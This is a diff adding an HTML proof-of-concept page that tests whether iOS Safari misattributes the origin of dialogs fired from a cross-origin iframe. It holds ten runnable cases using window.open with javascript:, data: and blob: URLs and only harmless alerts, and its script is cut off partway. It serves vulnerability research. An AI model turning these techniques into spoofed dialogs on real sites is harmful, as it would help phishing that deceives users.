@@ -1,0 +1,883 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>iOS Safari Origin Spoof PoC</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;700;800&display=swap');
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg: #080a0f;
+    --surface: #0f1119;
+    --surface2: #161b26;
+    --border: #1e2535;
+    --accent: #00e5ff;
+    --accent2: #ff4d6d;
+    --accent3: #7b61ff;
+    --warn: #ffb347;
+    --text: #b8c4d8;
+    --text-dim: #4a5570;
+    --text-bright: #eef2ff;
+    --pass: #00e5a0;
+    --fail: #ff4d6d;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'Syne', sans-serif;
+  }
+
+  html, body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 13px;
+    line-height: 1.6;
+    -webkit-text-size-adjust: 100%;
+    min-height: 100vh;
+  }
+
+  .container {
+    max-width: 520px;
+    margin: 0 auto;
+    padding: 20px 16px 60px;
+  }
+
+  /* Header */
+  .badge {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: rgba(255,77,109,0.1);
+    border: 1px solid rgba(255,77,109,0.25);
+    color: var(--fail); font-size: 10px; font-weight: 700;
+    letter-spacing: 0.12em; text-transform: uppercase;
+    padding: 4px 10px; border-radius: 4px; margin-bottom: 12px;
+  }
+
+  h1 {
+    font-family: var(--sans);
+    font-size: 22px; font-weight: 800;
+    color: var(--text-bright);
+    line-height: 1.2; letter-spacing: -0.02em;
+    margin-bottom: 4px;
+  }
+  h1 span { color: var(--accent); }
+
+  .origin-pill {
+    display: flex; align-items: center; gap: 8px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px; padding: 10px 14px;
+    margin: 12px 0; font-size: 12px;
+  }
+  .origin-pill .lbl { color: var(--text-dim); flex-shrink: 0; }
+  .origin-pill .val { color: var(--fail); font-weight: 700; word-break: break-all; }
+
+  /* iOS specific info */
+  .ios-box {
+    background: rgba(0,229,255,0.04);
+    border: 1px solid rgba(0,229,255,0.15);
+    border-left: 3px solid var(--accent);
+    border-radius: 8px;
+    padding: 14px 16px; margin: 14px 0;
+    font-size: 12px; line-height: 1.8;
+  }
+  .ios-box strong { color: var(--accent); }
+
+  /* Safari dialog diagram */
+  .dialog-diagram {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 14px;
+    margin: 14px 0;
+    font-size: 11px;
+  }
+  .dialog-diagram .dtitle {
+    font-size: 10px; text-transform: uppercase;
+    letter-spacing: 0.1em; color: var(--text-dim);
+    font-weight: 700; margin-bottom: 10px;
+  }
+  .safari-sheet {
+    background: #1c1c1e;
+    border-radius: 12px;
+    overflow: hidden;
+    border: 1px solid #2c2c2e;
+  }
+  .safari-sheet-header {
+    background: #2c2c2e;
+    padding: 10px 14px;
+    font-size: 12px;
+    border-bottom: 1px solid #3a3a3c;
+  }
+  .safari-sheet-header .origin-label {
+    font-weight: 700; margin-bottom: 2px;
+  }
+  .safari-sheet-header .origin-label.vuln { color: var(--fail); }
+  .safari-sheet-header .origin-label.safe { color: var(--pass); }
+  .safari-sheet-header .origin-sub { color: #8e8e93; font-size: 10px; }
+  .safari-sheet-body {
+    padding: 12px 14px;
+    font-size: 12px; color: #e5e5ea;
+    border-bottom: 1px solid #2c2c2e;
+    min-height: 36px;
+  }
+  .safari-sheet-btn {
+    padding: 10px 14px; text-align: center;
+    color: #0a84ff; font-size: 13px; font-weight: 600;
+  }
+  .sheet-row { display: grid; grid-template-columns: 1fr 1fr; }
+  .sheet-row .safari-sheet-btn:first-child {
+    border-right: 1px solid #2c2c2e;
+    color: #8e8e93;
+  }
+
+  /* Divider */
+  .divider { height: 1px; background: var(--border); margin: 16px 0; }
+
+  /* Section label */
+  .section-label {
+    font-size: 10px; text-transform: uppercase; letter-spacing: 0.12em;
+    color: var(--text-dim); font-weight: 700; margin-bottom: 12px;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .section-label::after { content:''; flex:1; height:1px; background:var(--border); }
+
+  /* Test case cards */
+  .tc-list { display: flex; flex-direction: column; gap: 10px; }
+
+  .tc-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px; overflow: hidden;
+  }
+
+  .tc-head {
+    display: flex; align-items: center; gap: 10px;
+    padding: 13px 14px;
+    cursor: pointer; -webkit-tap-highlight-color: transparent;
+    user-select: none;
+  }
+  .tc-head.open { border-bottom: 1px solid var(--border); }
+
+  .tc-num {
+    width: 26px; height: 26px; border-radius: 6px;
+    background: rgba(0,229,255,0.08);
+    border: 1px solid rgba(0,229,255,0.2);
+    color: var(--accent); font-size: 10px; font-weight: 700;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+  .tc-name {
+    font-family: var(--sans);
+    font-size: 13px; font-weight: 700;
+    color: var(--text-bright); flex: 1;
+    line-height: 1.3;
+  }
+  .tc-badge {
+    font-size: 9px; padding: 3px 7px; border-radius: 3px;
+    text-transform: uppercase; letter-spacing: 0.07em;
+    font-weight: 700; flex-shrink: 0;
+  }
+  .ios-only { background: rgba(0,229,255,0.08); color: var(--accent); border: 1px solid rgba(0,229,255,0.2); }
+  .webkit { background: rgba(123,97,255,0.1); color: var(--accent3); border: 1px solid rgba(123,97,255,0.2); }
+  .timing { background: rgba(255,179,71,0.1); color: var(--warn); border: 1px solid rgba(255,179,71,0.2); }
+  .shared { background: rgba(0,229,160,0.08); color: var(--pass); border: 1px solid rgba(0,229,160,0.2); }
+
+  .chevron { color: var(--text-dim); font-size: 11px; transition: transform 0.2s; }
+  .tc-head.open .chevron { transform: rotate(180deg); }
+
+  .tc-body { padding: 14px; display: none; }
+  .tc-body.open { display: block; }
+
+  .tc-desc {
+    font-size: 12px; color: var(--text); line-height: 1.7;
+    margin-bottom: 12px;
+  }
+
+  /* Steps */
+  .steps { margin-bottom: 12px; }
+  .steps-title {
+    font-size: 9px; text-transform: uppercase;
+    letter-spacing: 0.1em; color: var(--text-dim);
+    font-weight: 700; margin-bottom: 8px;
+  }
+  .step {
+    display: flex; gap: 8px; margin-bottom: 6px;
+    font-size: 12px; align-items: flex-start;
+  }
+  .step-n {
+    width: 18px; height: 18px; border-radius: 50%;
+    background: rgba(0,229,255,0.08); color: var(--accent);
+    font-size: 9px; font-weight: 700;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0; margin-top: 1px;
+  }
+
+  /* Result row */
+  .result-row {
+    display: grid; grid-template-columns: 1fr 1fr;
+    gap: 8px; margin-bottom: 12px;
+  }
+  .result-item {
+    border-radius: 6px; padding: 9px 10px; font-size: 11px;
+  }
+  .result-item.vuln {
+    background: rgba(255,77,109,0.06);
+    border: 1px solid rgba(255,77,109,0.2);
+  }
+  .result-item.safe {
+    background: rgba(0,229,160,0.05);
+    border: 1px solid rgba(0,229,160,0.15);
+  }
+  .result-item .rl {
+    font-size: 9px; text-transform: uppercase;
+    letter-spacing: 0.08em; font-weight: 700; margin-bottom: 3px;
+  }
+  .result-item.vuln .rl { color: var(--fail); }
+  .result-item.safe .rl { color: var(--pass); }
+  .result-item .rv { color: var(--text); line-height: 1.5; }
+
+  pre {
+    background: #050709;
+    border: 1px solid var(--border);
+    border-radius: 6px; padding: 10px 12px;
+    font-size: 10px; overflow-x: auto;
+    color: #8a9ab8; line-height: 1.7; margin-bottom: 10px;
+    -webkit-overflow-scrolling: touch;
+  }
+  .kw { color: #7b61ff; }
+  .str { color: #00e5a0; }
+  .fn { color: #00bcd4; }
+  .cm { color: #2e3a50; font-style: italic; }
+  .num { color: var(--warn); }
+
+  /* Run button — large touch target for mobile */
+  .run-btn {
+    width: 100%;
+    background: linear-gradient(135deg, rgba(255,77,109,0.15), rgba(255,77,109,0.08));
+    border: 1px solid rgba(255,77,109,0.35);
+    color: var(--fail);
+    font-family: var(--mono); font-size: 12px; font-weight: 700;
+    padding: 14px; border-radius: 8px; cursor: pointer;
+    text-transform: uppercase; letter-spacing: 0.08em;
+    transition: background 0.15s;
+    -webkit-tap-highlight-color: transparent;
+    min-height: 48px; /* iOS tap target minimum */
+  }
+  .run-btn:active { background: rgba(255,77,109,0.25); }
+
+  .note {
+    background: rgba(255,179,71,0.06);
+    border: 1px solid rgba(255,179,71,0.15);
+    border-radius: 6px; padding: 9px 12px;
+    font-size: 11px; color: var(--warn); line-height: 1.6;
+    margin-bottom: 10px;
+  }
+  .note::before { content: '⚑ '; }
+
+  /* Activity log */
+  .log-label {
+    font-size: 9px; text-transform: uppercase; letter-spacing: 0.1em;
+    color: var(--text-dim); font-weight: 700; margin-bottom: 6px;
+  }
+  .log {
+    background: #050709; border: 1px solid var(--border);
+    border-radius: 8px; padding: 10px 12px;
+    min-height: 70px; max-height: 130px; overflow-y: auto;
+    font-size: 10px; line-height: 1.9;
+    -webkit-overflow-scrolling: touch;
+  }
+  .log .le { margin-bottom: 1px; }
+  .log .le.ok { color: var(--pass); }
+  .log .le.err { color: var(--fail); }
+  .log .le.info { color: var(--accent2); }
+
+  /* Results table */
+  .results-table {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px; overflow: hidden;
+    margin-top: 8px;
+  }
+  .rt-row {
+    display: flex; align-items: center;
+    padding: 9px 12px; border-bottom: 1px solid var(--border);
+    font-size: 11px; gap: 8px;
+  }
+  .rt-row:last-child { border-bottom: none; }
+  .rt-tc { color: var(--text-dim); font-weight: 700; width: 40px; flex-shrink: 0; }
+  .rt-name { color: var(--text); flex: 1; }
+  .rt-result { font-size: 10px; font-weight: 700; flex-shrink: 0; }
+  .rt-result.pending { color: var(--text-dim); }
+  .rt-result.vuln { color: var(--fail); }
+  .rt-result.safe { color: var(--pass); }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <!-- Header -->
+  <div class="badge">iOS Safari · WebKit · Cross-Origin iframe</div>
+  <h1>iOS Safari <span>Origin Spoof</span> PoC</h1>
+
+  <div class="origin-pill">
+    <span class="lbl">iframe origin:</span>
+    <span class="val" id="frame-origin">loading...</span>
+  </div>
+
+  <!-- iOS Safari specific info -->
+  <div class="ios-box">
+    <strong>iOS Safari is different from Chrome:</strong><br>
+    • Dialogs appear as a <strong>bottom sheet</strong>, not a popup<br>
+    • The origin label is at the <strong>TOP of the sheet</strong><br>
+    • <code>window.open()</code> opens a new Safari tab, not a window<br>
+    • <strong>User tap required</strong> — tap the button directly to get gesture<br>
+    • WebKit has its own independent implementation of dialog attribution
+  </div>
+
+  <!-- What the Safari dialog looks like -->
+  <div class="dialog-diagram">
+    <div class="dtitle">What the iOS Safari dialog sheet looks like</div>
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
+      <div>
+        <div style="font-size:10px; color:var(--fail); font-weight:700; margin-bottom:6px;">❌ VULNERABLE</div>
+        <div class="safari-sheet">
+          <div class="safari-sheet-header">
+            <div class="origin-label vuln">1.hackeronce.com</div>
+            <div class="origin-sub">Top frame shown — WRONG</div>
+          </div>
+          <div class="safari-sheet-body">Dialog message here</div>
+          <div class="safari-sheet-btn">OK</div>
+        </div>
+      </div>
+      <div>
+        <div style="font-size:10px; color:var(--pass); font-weight:700; margin-bottom:6px;">✅ SAFE</div>
+        <div class="safari-sheet">
+          <div class="safari-sheet-header">
+            <div class="origin-label safe">sho3hit.github.io</div>
+            <div class="origin-sub">iframe origin — CORRECT</div>
+          </div>
+          <div class="safari-sheet-body">Dialog message here</div>
+          <div class="safari-sheet-btn">OK</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+  <div class="section-label">iOS-Specific Test Cases</div>
+
+  <div class="tc-list">
+
+    <!-- iOS01 -->
+    <div class="tc-card">
+      <div class="tc-head" onclick="toggle(this)">
+        <div class="tc-num">i01</div>
+        <div class="tc-name">javascript: URL → new Safari tab</div>
+        <span class="tc-badge ios-only">iOS</span>
+        <span class="chevron">▾</span>
+      </div>
+      <div class="tc-body">
+        <div class="tc-desc">
+          Basic PoC adapted for iOS. Cross-origin iframe opens a <code>javascript:</code>
+          URL as a new Safari tab. On iOS, <code>window.open()</code> without size params
+          opens a new tab in Safari rather than a popup. Dialog fires immediately in that tab.
+          Check the origin label at the top of the Safari sheet.
+        </div>
+        <div class="steps">
+          <div class="steps-title">Steps</div>
+          <div class="step"><div class="step-n">1</div>Tap the RUN button below</div>
+          <div class="step"><div class="step-n">2</div>Safari opens a new tab automatically</div>
+          <div class="step"><div class="step-n">3</div>A dialog sheet slides up from the bottom</div>
+          <div class="step"><div class="step-n">4</div>Read the <strong>domain name at the top of the sheet</strong></div>
+          <div class="step"><div class="step-n">5</div>Tap OK, return to previous tab</div>
+        </div>
+        <div class="result-row">
+          <div class="result-item vuln"><div class="rl">❌ Vulnerable</div><div class="rv">Sheet top shows:<br><code>1.hackeronce.com</code></div></div>
+          <div class="result-item safe"><div class="rl">✅ Safe</div><div class="rv">Sheet top shows:<br><code>sho3hit.github.io</code></div></div>
+        </div>
+        <pre><span class="kw">window</span>.<span class="fn">open</span>(
+  <span class="str">'javascript:alert("iOS01\\ndoc.domain: "+document.domain+"\\nwin.origin: "+window.origin)'</span>
+);</pre>
+        <button class="run-btn" onclick="event.stopPropagation();runTest('ios01')">▶ TAP TO RUN iOS01</button>
+      </div>
+    </div>
+
+    <!-- iOS02 -->
+    <div class="tc-card">
+      <div class="tc-head" onclick="toggle(this)">
+        <div class="tc-num">i02</div>
+        <div class="tc-name">data:,Hello + win.alert() cross-tab</div>
+        <span class="tc-badge ios-only">iOS</span>
+        <span class="chevron">▾</span>
+      </div>
+      <div class="tc-body">
+        <div class="tc-desc">
+          Opens <code>data:,Hello</code> in a new Safari tab, then after 800ms the iframe
+          calls <code>win.alert()</code> on that tab. On iOS, the timing needs to be
+          longer than desktop (800ms vs 100ms) to allow Safari to finish tab initialization.
+        </div>
+        <div class="note">On iOS, the dialog may appear on the new tab. Switch to it if nothing shows immediately.</div>
+        <div class="result-row">
+          <div class="result-item vuln"><div class="rl">❌ Vulnerable</div><div class="rv">Sheet shows:<br><code>1.hackeronce.com</code></div></div>
+          <div class="result-item safe"><div class="rl">✅ Safe</div><div class="rv">Sheet shows:<br><code>sho3hit.github.io</code></div></div>
+        </div>
+        <pre><span class="kw">var</span> win = <span class="kw">window</span>.<span class="fn">open</span>(<span class="str">'data:,Hello'</span>);
+<span class="cm">// 800ms — iOS Safari needs more init time</span>
+<span class="fn">setTimeout</span>(() => {
+  win.<span class="fn">alert</span>(<span class="str">'iOS02 cross-tab\\niframe: '</span> + <span class="kw">window</span>.origin);
+}, <span class="num">800</span>);</pre>
+        <button class="run-btn" onclick="event.stopPropagation();runTest('ios02')">▶ TAP TO RUN iOS02</button>
+      </div>
+    </div>
+
+    <!-- iOS03 -->
+    <div class="tc-card">
+      <div class="tc-head" onclick="toggle(this)">
+        <div class="tc-num">i03</div>
+        <div class="tc-name">confirm() sheet on iOS</div>
+        <span class="tc-badge webkit">WebKit</span>
+        <span class="chevron">▾</span>
+      </div>
+      <div class="tc-body">
+        <div class="tc-desc">
+          Tests <code>confirm()</code> dialog type on iOS Safari. Safari's sheet for
+          <code>confirm()</code> shows two buttons (Cancel / OK) and the origin at the top.
+          WebKit may have a different code path for confirm vs alert — check if origin
+          attribution is consistent.
+        </div>
+        <div class="result-row">
+          <div class="result-item vuln"><div class="rl">❌ Vulnerable</div><div class="rv">confirm sheet top shows:<br><code>1.hackeronce.com</code></div></div>
+          <div class="result-item safe"><div class="rl">✅ Safe</div><div class="rv">confirm sheet top shows:<br><code>sho3hit.github.io</code></div></div>
+        </div>
+        <pre><span class="kw">var</span> win = <span class="kw">window</span>.<span class="fn">open</span>(<span class="str">'data:,Hello'</span>);
+<span class="fn">setTimeout</span>(() => {
+  win.<span class="fn">confirm</span>(<span class="str">'iOS03 confirm()\\niframe: '</span> + <span class="kw">window</span>.origin);
+}, <span class="num">800</span>);</pre>
+        <button class="run-btn" onclick="event.stopPropagation();runTest('ios03')">▶ TAP TO RUN iOS03</button>
+      </div>
+    </div>
+
+    <!-- iOS04 -->
+    <div class="tc-card">
+      <div class="tc-head" onclick="toggle(this)">
+        <div class="tc-num">i04</div>
+        <div class="tc-name">prompt() sheet on iOS</div>
+        <span class="tc-badge webkit">WebKit</span>
+        <span class="chevron">▾</span>
+      </div>
+      <div class="tc-body">
+        <div class="tc-desc">
+          Tests <code>prompt()</code> on iOS Safari. The prompt sheet includes a text
+          input field and shows the origin at the top. On iOS, the keyboard may appear
+          which shifts the layout — check origin label before the keyboard obscures it.
+        </div>
+        <div class="result-row">
+          <div class="result-item vuln"><div class="rl">❌ Vulnerable</div><div class="rv">prompt sheet top shows:<br><code>1.hackeronce.com</code></div></div>
+          <div class="result-item safe"><div class="rl">✅ Safe</div><div class="rv">prompt sheet top shows:<br><code>sho3hit.github.io</code></div></div>
+        </div>
+        <pre><span class="kw">var</span> win = <span class="kw">window</span>.<span class="fn">open</span>(<span class="str">'data:,Hello'</span>);
+<span class="fn">setTimeout</span>(() => {
+  win.<span class="fn">prompt</span>(<span class="str">'iOS04 prompt()\\niframe: '</span> + <span class="kw">window</span>.origin, <span class="str">''</span>);
+}, <span class="num">800</span>);</pre>
+        <button class="run-btn" onclick="event.stopPropagation();runTest('ios04')">▶ TAP TO RUN iOS04</button>
+      </div>
+    </div>
+
+    <!-- iOS05 -->
+    <div class="tc-card">
+      <div class="tc-head" onclick="toggle(this)">
+        <div class="tc-num">i05</div>
+        <div class="tc-name">Blob URL — WebKit blob origin handling</div>
+        <span class="tc-badge webkit">WebKit</span>
+        <span class="chevron">▾</span>
+      </div>
+      <div class="tc-body">
+        <div class="tc-desc">
+          Creates a Blob URL owned by the iframe's origin and opens it in a new Safari tab.
+          WebKit's blob URL origin handling is separate from Chromium's. The blob's
+          creator is the iframe — if the sheet shows the top frame instead,
+          WebKit has the same bug class independently.
+        </div>
+        <div class="result-row">
+          <div class="result-item vuln"><div class="rl">❌ Vulnerable</div><div class="rv">Blob tab sheet shows:<br><code>1.hackeronce.com</code></div></div>
+          <div class="result-item safe"><div class="rl">✅ Safe</div><div class="rv">Blob tab sheet shows:<br><code>sho3hit.github.io</code></div></div>
+        </div>
+        <pre><span class="kw">const</span> html = <span class="str">`&lt;script&gt;
+alert('iOS05 Blob\\nCreator: sho3hit.github.io\\nwin.origin: '+window.origin);
+&lt;/script&gt;`</span>;
+<span class="kw">const</span> blob = <span class="kw">new</span> <span class="fn">Blob</span>([html], {type:<span class="str">'text/html'</span>});
+<span class="kw">window</span>.<span class="fn">open</span>(URL.<span class="fn">createObjectURL</span>(blob));</pre>
+        <button class="run-btn" onclick="event.stopPropagation();runTest('ios05')">▶ TAP TO RUN iOS05</button>
+      </div>
+    </div>
+
+    <!-- iOS06 -->
+    <div class="tc-card">
+      <div class="tc-head" onclick="toggle(this)">
+        <div class="tc-num">i06</div>
+        <div class="tc-name">about:blank#hash — WebKit safe path</div>
+        <span class="tc-badge webkit">WebKit</span>
+        <span class="chevron">▾</span>
+      </div>
+      <div class="tc-body">
+        <div class="tc-desc">
+          Opens <code>about:blank#fragment</code> in Safari. Pure <code>about:blank</code>
+          is a special-cased safe URL in both Chromium and WebKit. Adding a fragment
+          (<code>#hash</code>) may bypass WebKit's safe path check since the URL
+          is no longer exactly <code>about:blank</code>.
+        </div>
+        <div class="result-row">
+          <div class="result-item vuln"><div class="rl">❌ Vulnerable</div><div class="rv">Fragment bypassed WebKit safe path — sheet shows top frame</div></div>
+          <div class="result-item safe"><div class="rl">✅ Safe</div><div class="rv">Same as about:blank — sheet shows iframe origin</div></div>
+        </div>
+        <pre><span class="kw">var</span> win = <span class="kw">window</span>.<span class="fn">open</span>(<span class="str">'about:blank#ios-test'</span>);
+<span class="fn">setTimeout</span>(() => {
+  win.<span class="fn">alert</span>(<span class="str">'iOS06 about:blank#hash\\niframe: '</span> + <span class="kw">window</span>.origin);
+}, <span class="num">800</span>);</pre>
+        <button class="run-btn" onclick="event.stopPropagation();runTest('ios06')">▶ TAP TO RUN iOS06</button>
+      </div>
+    </div>
+
+    <!-- iOS07 -->
+    <div class="tc-card">
+      <div class="tc-head" onclick="toggle(this)">
+        <div class="tc-num">i07</div>
+        <div class="tc-name">Immediate alert — no setTimeout (iOS race)</div>
+        <span class="tc-badge timing">Timing</span>
+        <span class="chevron">▾</span>
+      </div>
+      <div class="tc-body">
+        <div class="tc-desc">
+          Calls <code>win.alert()</code> synchronously with zero delay after
+          <code>window.open()</code>. iOS Safari's tab initialization is slower than
+          desktop Chrome — the NavigationEntry may be in an even more undefined state
+          at the point the dialog fires. This is the highest-risk timing variant on iOS.
+        </div>
+        <div class="note">May be blocked on iOS. Check activity log below for errors if no dialog appears.</div>
+        <div class="result-row">
+          <div class="result-item vuln"><div class="rl">❌ Vulnerable</div><div class="rv">Immediate dialog fires showing top frame origin</div></div>
+          <div class="result-item safe"><div class="rl">✅ Safe / Blocked</div><div class="rv">Dialog blocked, or shows iframe origin</div></div>
+        </div>
+        <pre><span class="kw">var</span> win = <span class="kw">window</span>.<span class="fn">open</span>(<span class="str">'data:,Hello'</span>);
+<span class="cm">// Synchronous — no setTimeout at all</span>
+<span class="kw">try</span> {
+  win.<span class="fn">alert</span>(<span class="str">'iOS07 immediate\\niframe: '</span> + <span class="kw">window</span>.origin);
+} <span class="kw">catch</span>(e) {
+  console.<span class="fn">log</span>(<span class="str">'Blocked:'</span>, e.message);
+}</pre>
+        <button class="run-btn" onclick="event.stopPropagation();runTest('ios07')">▶ TAP TO RUN iOS07</button>
+      </div>
+    </div>
+
+    <!-- iOS08 -->
+    <div class="tc-card">
+      <div class="tc-head" onclick="toggle(this)">
+        <div class="tc-num">i08</div>
+        <div class="tc-name">Multi-nav in new Safari tab</div>
+        <span class="tc-badge timing">Timing</span>
+        <span class="chevron">▾</span>
+      </div>
+      <div class="tc-body">
+        <div class="tc-desc">
+          Opens <code>data:,First</code> in a new tab, then navigates to
+          <code>data:,Second</code>, then triggers the dialog. On iOS Safari,
+          back-forward cache (BFCache) is aggressively used — a second navigation
+          may restore a cached state with stale NavigationEntry origin data.
+        </div>
+        <div class="result-row">
+          <div class="result-item vuln"><div class="rl">❌ Vulnerable</div><div class="rv">After 2nd nav, dialog shows stale or top-frame origin</div></div>
+          <div class="result-item safe"><div class="rl">✅ Safe</div><div class="rv">Dialog shows iframe origin consistently after both navs</div></div>
+        </div>
+        <pre><span class="kw">var</span> win = <span class="kw">window</span>.<span class="fn">open</span>(<span class="str">'data:,First'</span>);
+<span class="fn">setTimeout</span>(() => {
+  win.location.href = <span class="str">'data:,Second'</span>; <span class="cm">// 2nd nav</span>
+  <span class="fn">setTimeout</span>(() => {
+    win.<span class="fn">alert</span>(<span class="str">'iOS08 after 2nd nav\\niframe: '</span> + <span class="kw">window</span>.origin);
+  }, <span class="num">800</span>); <span class="cm">// iOS BFCache needs more time</span>
+}, <span class="num">800</span>);</pre>
+        <button class="run-btn" onclick="event.stopPropagation();runTest('ios08')">▶ TAP TO RUN iOS08</button>
+      </div>
+    </div>
+
+    <!-- iOS09 -->
+    <div class="tc-card">
+      <div class="tc-head" onclick="toggle(this)">
+        <div class="tc-num">i09</div>
+        <div class="tc-name">javascript:void(0) + delayed win.alert()</div>
+        <span class="tc-badge webkit">WebKit</span>
+        <span class="chevron">▾</span>
+      </div>
+      <div class="tc-body">
+        <div class="tc-desc">
+          Opens <code>javascript:void(0)</code> — no inline dialog — then after a delay
+          calls <code>win.alert()</code> from the iframe. On iOS Safari,
+          <code>javascript:</code> URLs in <code>window.open()</code> may be handled
+          differently than on desktop. Tests the two-step invocation pattern on WebKit.
+        </div>
+        <div class="result-row">
+          <div class="result-item vuln"><div class="rl">❌ Vulnerable</div><div class="rv">Sheet shows top frame origin</div></div>
+          <div class="result-item safe"><div class="rl">✅ Safe</div><div class="rv">Sheet shows <code>sho3hit.github.io</code></div></div>
+        </div>
+        <pre><span class="kw">var</span> win = <span class="kw">window</span>.<span class="fn">open</span>(<span class="str">'javascript:void(0)'</span>);
+<span class="fn">setTimeout</span>(() => {
+  win.<span class="fn">alert</span>(<span class="str">'iOS09 void(0)\\niframe: '</span> + <span class="kw">window</span>.origin);
+}, <span class="num">800</span>);</pre>
+        <button class="run-btn" onclick="event.stopPropagation();runTest('ios09')">▶ TAP TO RUN iOS09</button>
+      </div>
+    </div>
+
+    <!-- iOS10 -->
+    <div class="tc-card">
+      <div class="tc-head" onclick="toggle(this)">
+        <div class="tc-num">i10</div>
+        <div class="tc-name">beforeunload on iOS Safari</div>
+        <span class="tc-badge webkit">WebKit</span>
+        <span class="chevron">▾</span>
+      </div>
+      <div class="tc-body">
+        <div class="tc-desc">
+          Sets <code>onbeforeunload</code> on the opened tab then navigates it away.
+          iOS Safari handles <code>beforeunload</code> differently — it often suppresses
+          it entirely on mobile. If it does fire, check the origin in the sheet.
+          If it doesn't fire, that itself is logged in the activity log below.
+        </div>
+        <div class="note">beforeunload is often suppressed by iOS Safari — no dialog appearing is expected behavior, not a bug.</div>
+        <div class="result-row">
+          <div class="result-item vuln"><div class="rl">❌ Vulnerable</div><div class="rv">If sheet fires — shows top frame origin</div></div>
+          <div class="result-item safe"><div class="rl">✅ Expected</div><div class="rv">iOS suppresses beforeunload — no dialog (normal behavior)</div></div>
+        </div>
+        <pre><span class="kw">var</span> win = <span class="kw">window</span>.<span class="fn">open</span>(<span class="str">'data:,Hello'</span>);
+<span class="fn">setTimeout</span>(() => {
+  win.onbeforeunload = () => <span class="str">'iOS10 beforeunload — check origin'</span>;
+  <span class="fn">setTimeout</span>(() => {
+    win.location.href = <span class="str">'about:blank'</span>; <span class="cm">// triggers beforeunload</span>
+  }, <span class="num">400</span>);
+}, <span class="num">800</span>);</pre>
+        <button class="run-btn" onclick="event.stopPropagation();runTest('ios10')">▶ TAP TO RUN iOS10</button>
+      </div>
+    </div>
+
+  </div><!-- /tc-list -->
+
+  <div class="divider"></div>
+
+  <!-- Activity log -->
+  <div class="log-label">Activity Log</div>
+  <div class="log" id="log"></div>
+
+  <div class="divider"></div>
+
+  <!-- Results summary -->
+  <div class="section-label">Results Summary</div>
+  <div class="results-table" id="results-table">
+    <div class="rt-row"><span class="rt-tc">i01</span><span class="rt-name">javascript: URL new tab</span><span class="rt-result pending" id="r-ios01">pending</span></div>
+    <div class="rt-row"><span class="rt-tc">i02</span><span class="rt-name">data: + win.alert()</span><span class="rt-result pending" id="r-ios02">pending</span></div>
+    <div class="rt-row"><span class="rt-tc">i03</span><span class="rt-name">confirm() sheet</span><span class="rt-result pending" id="r-ios03">pending</span></div>
+    <div class="rt-row"><span class="rt-tc">i04</span><span class="rt-name">prompt() sheet</span><span class="rt-result pending" id="r-ios04">pending</span></div>
+    <div class="rt-row"><span class="rt-tc">i05</span><span class="rt-name">Blob URL</span><span class="rt-result pending" id="r-ios05">pending</span></div>
+    <div class="rt-row"><span class="rt-tc">i06</span><span class="rt-name">about:blank#hash</span><span class="rt-result pending" id="r-ios06">pending</span></div>
+    <div class="rt-row"><span class="rt-tc">i07</span><span class="rt-name">Immediate (no setTimeout)</span><span class="rt-result pending" id="r-ios07">pending</span></div>
+    <div class="rt-row"><span class="rt-tc">i08</span><span class="rt-name">Multi-navigation + BFCache</span><span class="rt-result pending" id="r-ios08">pending</span></div>
+    <div class="rt-row"><span class="rt-tc">i09</span><span class="rt-name">javascript:void(0)</span><span class="rt-result pending" id="r-ios09">pending</span></div>
+    <div class="rt-row"><span class="rt-tc">i10</span><span class="rt-name">beforeunload</span><span class="rt-result pending" id="r-ios10">pending</span></div>
+  </div>
+
+  <!-- How to record result -->
+  <div class="ios-box" style="margin-top:14px; border-left-color:var(--warn);">
+    <strong style="color:var(--warn)">After each dialog:</strong> Tap the result below to record what you saw.<br>
+    This updates the summary table above.
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px;">
+      <button onclick="recordResult('vuln')" style="background:rgba(255,77,109,0.1);border:1px solid rgba(255,77,109,0.3);color:var(--fail);font-family:var(--mono);font-size:11px;font-weight:700;padding:10px;border-radius:6px;cursor:pointer;-webkit-tap-highlight-color:transparent;">
+        ❌ Saw top frame origin<br><span style="font-size:9px;font-weight:400;">(1.hackeronce.com)</span>
+      </button>
+      <button onclick="recordResult('safe')" style="background:rgba(0,229,160,0.06);border:1px solid rgba(0,229,160,0.2);color:var(--pass);font-family:var(--mono);font-size:11px;font-weight:700;padding:10px;border-radius:6px;cursor:pointer;-webkit-tap-highlight-color:transparent;">
+        ✅ Saw iframe origin<br><span style="font-size:9px;font-weight:400;">(sho3hit.github.io)</span>
+      </button>
+    </div>
+  </div>
+
+</div><!-- /container -->
+
+<script>
+  const myOrigin = window.location.origin;
+  document.getElementById('frame-origin').textContent = myOrigin;
+
+  // Get top-frame origin via postMessage
+  try { window.parent.postMessage('give-origin', '*'); } catch(e){}
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.type === 'top-origin') {
+      window._topOrigin = e.data.origin;
+    }
+  });
+
+  let lastRanTC = null;
+
+  function log(msg, type='info') {
+    const el = document.createElement('div');
+    el.className = 'le ' + type;
+    el.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+    const logEl = document.getElementById('log');
+    logEl.appendChild(el);
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  function toggle(header) {
+    const body = header.nextElementSibling;
+    const isOpen = body.classList.contains('open');
+    document.querySelectorAll('.tc-body').forEach(b => b.classList.remove('open'));
+    document.querySelectorAll('.tc-head').forEach(h => h.classList.remove('open'));
